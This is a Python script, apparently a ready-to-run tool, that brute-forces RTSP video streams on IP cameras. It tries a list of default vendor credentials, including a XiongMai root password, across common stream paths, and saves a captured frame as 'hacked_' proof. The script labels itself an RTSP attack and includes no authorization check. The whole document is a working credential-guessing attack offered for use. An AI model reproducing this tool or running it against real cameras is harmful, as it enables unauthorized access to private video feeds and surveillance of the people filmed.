import sys
import time
import os

try:
    import cv2
except ImportError:
    print("[-] OpenCV not installed. Please run: pip install opencv-python")
    sys.exit(1)

# Configuration
RTSP_PATHS = [
    "",
    "/",
    "/live",
    "/live/ch0",
    "/live/ch1",
    "/h264_stream",
    "/ch0_0.h264",
    "/11",
    "/12",
    "/unicast",
    "/stream1",
    "/sd",
    "/hd",
    "/onvif1",
    "/mpeg4",
    "/media/video1",
    "/live/main",
    "/av0_0",
    # Xiaomi specific hacks (sometimes work on hacked firmware)
    "/ch0_0.264"
]

CREDENTIALS = [
    (None, None), # No auth
    ("admin", "admin"),
    ("default", "default"),
    ("admin", "12345"),
    ("admin", "123456"),
    ("root", "root"),
    ("root", "12345"),
    ("root", "xmhdipc"), # Common for XiongMai
    ("admin", ""), # Empty pass
]

def try_connect(ip, port, user, password, path):
    """
    Constructs RTSP URL and attempts to capture a frame.
    Returns True if successful.
    """
    # Construct URL
    # Format: rtsp://user:pass@IP:554/path
    url = "rtsp://"
    if user and password is not None:
        url += f"{user}:{password}@"
    url += f"{ip}:{port}{path}"
    
    print(f"[*] Trying: {url.replace(password if password else 'X', '***') if password else url} ", end='\r')
    
    # Attempt connection with OpenCV
    # We use CAP_FFMPEG backend
    cap = cv2.VideoCapture(url, cv2.CAP_FFMPEG)
    
    if not cap.isOpened():
        return False
        
    # Attempt to read a frame
    ret, frame = cap.read()
    if ret:
        print(f"\n[+] SUCCESS! Connected to {path} with user='{user}'")
        filename = f"hacked_{ip}_{user or 'noauth'}.jpg"
        cv2.imwrite(filename, frame)
        print(f"[+] Proof saved to {filename}")
        cap.release()
        return True
    
    cap.release()
    return False

def main():
    if len(sys.argv) < 2:
        print(f"Usage: python3 {sys.argv[0]} <Target_IP> [Port]")
        return
        
    target_ip = sys.argv[1]
    port = sys.argv[2] if len(sys.argv) > 2 else "554"
    
    print(f"[*] Starting RTSP Attack on {target_ip}:{port}")
    if target_ip.startswith("192.168.0.229"):
        print("[!] Note: Xiaomi cameras often block local RTSP unless 'NAS Storage' is enabled in settings.")
    
    found = False
    
    for user, password in CREDENTIALS:
        for path in RTSP_PATHS:
            if try_connect(target_ip, port, user, password, path):
                found = True
                break # Break inner loop (path)
        if found:
            break # Break outer loop (creds) -> Stop after first success
            
    if not found:
        print("\n[-] Attack finished. No stream found.")
        print("    Suggestions:")
        print("    1. Verify port 554 is actually open (use nmap).")
        print("    2. Camera might require specific proprietary authentication.")
        print("    3. Try enabling RTSP/NAS in camera settings.")

if __name__ == "__main__":
    main()
